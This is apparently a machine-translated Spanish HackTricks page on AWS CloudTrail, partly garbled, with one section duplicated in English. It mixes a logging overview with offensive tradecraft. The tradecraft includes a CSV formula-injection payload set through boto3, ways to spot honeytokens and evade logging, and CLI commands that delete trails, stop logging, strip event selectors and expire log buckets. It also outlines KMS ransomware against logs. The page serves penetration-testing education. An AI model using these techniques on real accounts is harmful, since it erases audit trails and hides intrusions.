# AWS - Enumeraci칩n de CloudTrail

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop).
* Obt칠n [**productos oficiales de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

## **CloudTrail**

AWS CloudTrail **registra y supervisa la actividad dentro de tu entorno de AWS**. Captura registros detallados de eventos, incluyendo qui칠n hizo qu칠, cu치ndo y desde d칩nde, para todas las interacciones con los recursos de AWS. Esto proporciona un registro de auditor칤a de cambios y acciones, ayudando en el an치lisis de seguridad, auditor칤a de cumplimiento y seguimiento de cambios de recursos. CloudTrail es esencial para comprender el comportamiento de usuarios y recursos, mejorar las posturas de seguridad y garantizar el cumplimiento normativo.

Cada evento registrado contiene:

* El nombre de la API llamada: `eventName`
* El servicio llamado: `eventSource`
* La hora: `eventTime`
* La direcci칩n IP: `SourceIPAddress`
* El m칠todo del agente: `userAgent`. Ejemplos:
* Signing.amazonaws.com - Desde la Consola de Administraci칩n de AWS
* console.amazonaws.com - Usuario ra칤z de la cuenta
* lambda.amazonaws.com - AWS Lambda
* Los par치metros de la solicitud: `requestParameters`
* Los elementos de respuesta: `responseElements`

Los eventos se escriben en un nuevo archivo de registro **aproximadamente cada 5 minutos en un archivo JSON**, son retenidos por CloudTrail y finalmente, los archivos de registro se **env칤an a S3 aproximadamente 15 minutos despu칠s**.\
Los registros de CloudTrail se pueden **agregar en varias cuentas y regiones**.\
CloudTrail permite utilizar **la integridad del archivo de registro para poder verificar que tus archivos de registro no han cambiado** desde que CloudTrail los entreg칩. Crea un hash SHA-256 de los registros dentro de un archivo de resumen. Se crea un hash SHA-256 de los nuevos registros cada hora.\
Al crear un Trail, los selectores de eventos te permitir치n indicar el tipo de eventos a registrar: eventos de gesti칩n, datos o informaci칩n.

Los registros se guardan en un bucket de S3. Por defecto, se utiliza el cifrado en el lado del servidor (SSE-S3), por lo que AWS descifrar치 el contenido para las personas que tengan acceso a 칠l, pero para mayor seguridad, puedes utilizar SSE con KMS y tus propias claves.

### Convenci칩n de nomenclatura de archivos de registro

![](<../../../../.gitbook/assets/image (29).png>)

### Estructura de carpetas en S3

![](<../../../../.gitbook/assets/image (47).png>)

Ten en cuenta que las carpetas "_AWSLogs_" y "_CloudTrail_" son nombres de carpetas fijos,

Los archivos **Digest** tienen una estructura de carpetas similar:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregar registros de varias cuentas

* Crea un Trail en la cuenta de AWS donde deseas que se entreguen los archivos de registro
* Aplica permisos al bucket de S3 de destino que permitan el acceso entre cuentas para CloudTrail y permite el acceso a cada cuenta de AWS que lo necesite
* Crea un nuevo Trail en las otras cuentas de AWS y selecciona el uso del bucket creado en el paso 1

Sin embargo, aunque puedes guardar todos los registros en el mismo bucket de S3, no puedes agregar los registros de CloudTrail de varias cuentas en un CloudWatch Logs perteneciente a una sola cuenta de AWS.

### Cloudtrail de todas las cuentas de la organizaci칩n en 1

Al crear un CloudTrail, es posible indicar que se active CloudTrail para todas las cuentas de la organizaci칩n y obtener los registros en solo 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

De esta manera, puedes configurar f치cilmente CloudTrail en todas las regiones de todas las cuentas y centralizar los registros en 1 cuenta (que debes proteger).

### Verificaci칩n de archivos de registro

Puedes verificar que los registros no hayan sido alterados ejecutando

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Registros en CloudWatch

**CloudTrail puede enviar autom치ticamente registros a CloudWatch para que pueda configurar alertas que le adviertan cuando se realicen actividades sospechosas.**\
Tenga en cuenta que para permitir que CloudTrail env칤e los registros a CloudWatch, es necesario crear un **rol** que permita esa acci칩n. Si es posible, se recomienda utilizar el rol predeterminado de AWS para realizar estas acciones. Este rol permitir치 a CloudTrail:

* CreateLogStream: Esto permite crear flujos de registro de CloudWatch Logs
* PutLogEvents: Entregar registros de CloudTrail a flujos de registro de CloudWatch Logs

### Historial de eventos

El Historial de eventos de CloudTrail le permite inspeccionar en una tabla los registros que se han registrado:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** analiza autom치ticamente los eventos de administraci칩n de escritura de los senderos de CloudTrail y le alerta sobre actividades inusuales. Por ejemplo, si hay un aumento en los eventos `TerminateInstance` que difiere de los baselines establecidos, lo ver치 como un evento de Insight. Estos eventos facilitan m치s que nunca encontrar y responder a actividades de API inusuales.

### Seguridad

| Integridad del archivo de registro de CloudTrail | <ul><li>Validar si los registros han sido manipulados (modificados o eliminados)</li><li><p>Utiliza archivos de resumen (crea un hash para cada archivo)</p><ul><li>Hashing SHA-256</li><li>SHA-256 con RSA para firma digital</li><li>clave privada propiedad de Amazon</li></ul></li><li>Tarda 1 hora en crear un archivo de resumen (se realiza cada hora en punto)</li></ul> |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Detener el acceso no autorizado                  | <ul><li><p>Utilice pol칤ticas de IAM y pol칤ticas de cubo S3</p><ul><li>equipo de seguridad -> acceso de administrador</li><li>auditores -> acceso de solo lectura</li></ul></li><li>Utilice SSE-S3/SSE-KMS para cifrar los registros</li></ul>                                                                                                                                                  |
| Evitar que se eliminen los archivos de registro   | <ul><li>Restringir el acceso de eliminaci칩n con IAM y pol칤ticas de cubo</li><li>Configurar eliminaci칩n de S3 MFA</li><li>Validar con la Validaci칩n de archivos de registro</li></ul>                                                                                                                                                                                                |

## Acciones

### Enumeraci칩n
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Inyecci칩n de CSV**

Es posible realizar una inyecci칩n de CSV dentro de CloudTrail que ejecutar치 c칩digo arbitrario si los registros se exportan en formato CSV y se abren con Excel.\
El siguiente c칩digo generar치 una entrada de registro con un nombre de Trail incorrecto que contiene la carga 칰til:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Para obtener m치s informaci칩n sobre las Inyecciones CSV, consulta la p치gina:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Para obtener m치s informaci칩n sobre esta t칠cnica espec칤fica, consulta [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass de Detecci칩n**

### Bypass de HoneyTokens

Los HoneyTokens se crean para **detectar la filtraci칩n de informaci칩n sensible**. En el caso de AWS, son **claves de AWS cuyo uso se monitorea**, si algo activa una acci칩n con esa clave, entonces alguien debe haber robado esa clave.

Sin embargo, esta monitorizaci칩n se realiza a trav칠s de **CloudTrail**, y hay algunos **servicios de AWS que no env칤an registros a CloudTrail** (encuentra la [lista aqu칤](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Algunos de esos servicios **responder치n** con un **error** que contiene el **ARN del rol de clave** si alguien no autorizado (la clave de HoneyToken) intenta acceder a 칠l.

De esta manera, un **atacante puede obtener el ARN de la clave sin activar ning칰n registro**. En el ARN, el atacante puede ver el **ID y el nombre de la cuenta de AWS**, es f치cil saber los ID y nombres de las cuentas de las empresas de HoneyToken, por lo que de esta manera un atacante puede identificar si el token es un HoneyToken.

![](<../../../../.gitbook/assets/image (65).png>)

#### Detecci칩n de HoneyTokens

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) detecta si una clave pertenece a [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Si **`canarytokens.org`** aparece en el nombre del rol o el ID de la cuenta **`534261010715`** aparece en el mensaje de error.
* Prob치ndolos m치s recientemente, est치n utilizando la cuenta **`717712589309`** y todav칤a tienen la cadena **`canarytokens.com`** en el nombre.
* Si **`SpaceCrab`** aparece en el nombre del rol en el mensaje de error.
* **SpaceSiren** utiliza **uuids** para generar nombres de usuario: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Si el **nombre parece generado al azar**, hay altas probabilidades de que sea un HoneyToken.

{% hint style="danger" %}
Ten en cuenta que todas las API p칰blicas descubiertas que no creaban registros de CloudTrail ahora est치n solucionadas, as칤 que tal vez necesites encontrar las tuyas propias...
{% endhint %}

Para obtener m치s informaci칩n, consulta la [**investigaci칩n original**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Accediendo a Infraestructura de Terceros

Ciertos servicios de AWS generar치n alguna infraestructura, como **bases de datos** o **cl칰steres de Kubernetes** (EKS). Un usuario que **se comunique directamente con esos servicios** (un puerto de base de datos o la API de Kubernetes) **no utilizar치 la API de AWS**, por lo que CloudTrail no podr치 ver esta comunicaci칩n.

Por lo tanto, un usuario con acceso a EKS que haya descubierto la URL de la API de EKS podr칤a generar un token localmente y **comunicarse directamente con el servicio de API sin ser detectado por CloudTrail**.

M치s informaci칩n en:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modificando la Configuraci칩n de CloudTrail

#### Eliminar rastros
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Detener rastreos

To stop a CloudTrail trail, you can use the AWS Management Console, AWS CLI, or AWS SDKs. The following steps outline how to stop a trail using the AWS Management Console:

1. Open the AWS Management Console and navigate to the CloudTrail service.
2. In the left navigation pane, click on "Trails".
3. Select the trail that you want to stop.
4. Click on the "Actions" dropdown menu and choose "Stop logging".
5. Confirm the action by clicking on "Stop logging" in the dialog box.

Once the trail is stopped, it will no longer capture any API activity. Keep in mind that stopping a trail does not delete the existing log files. If you want to delete the log files, you can do so manually or configure the trail to delete them automatically after a certain period of time.

#### Detener rastreos

Para detener un rastro de CloudTrail, puedes utilizar la Consola de administraci칩n de AWS, AWS CLI o las SDK de AWS. Los siguientes pasos describen c칩mo detener un rastro utilizando la Consola de administraci칩n de AWS:

1. Abre la Consola de administraci칩n de AWS y navega hasta el servicio de CloudTrail.
2. En el panel de navegaci칩n izquierdo, haz clic en "Rastreos".
3. Selecciona el rastro que deseas detener.
4. Haz clic en el men칰 desplegable "Acciones" y elige "Detener registro".
5. Confirma la acci칩n haciendo clic en "Detener registro" en el cuadro de di치logo.

Una vez que el rastro se detiene, ya no capturar치 ninguna actividad de la API. Ten en cuenta que detener un rastro no elimina los archivos de registro existentes. Si deseas eliminar los archivos de registro, puedes hacerlo manualmente o configurar el rastro para que los elimine autom치ticamente despu칠s de un cierto per칤odo de tiempo.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Desactivar el registro en varias regiones

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Desactivar el registro mediante selectores de eventos

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

En el primer ejemplo, se proporciona un 칰nico selector de eventos como un arreglo JSON con un solo objeto. El `"ReadWriteType": "ReadOnly"` indica que el **selector de eventos solo capturar치 eventos de solo lectura** (por lo que CloudTrail insights **no verificar치 eventos de escritura**, por ejemplo).

Puede personalizar el selector de eventos seg칰n sus requisitos espec칤ficos.

#### Eliminaci칩n de registros mediante la pol칤tica de ciclo de vida de S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modificando la configuraci칩n del bucket

* Eliminar el bucket de S3
* Cambiar la pol칤tica del bucket para denegar cualquier escritura desde el servicio CloudTrail
* Agregar una pol칤tica de ciclo de vida al bucket de S3 para eliminar objetos
* Desactivar la clave KMS utilizada para cifrar los registros de CloudTrail

### Ransomware de CloudTrail

#### Ransomware de S3

Podr칤as **generar una clave asim칠trica** y hacer que **CloudTrail cifre los datos** con esa clave y **eliminar la clave privada** para que el contenido de CloudTrail no pueda ser recuperado.\
B치sicamente, esto es un **ransomware de S3-KMS** explicado en:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware de KMS**

Esta es una forma m치s sencilla de realizar el ataque anterior con diferentes requisitos de permisos:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referencias**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>춰Apoya a HackTricks y obt칠n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **칰ltima versi칩n de PEASS o descargar HackTricks en PDF**, 춰consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
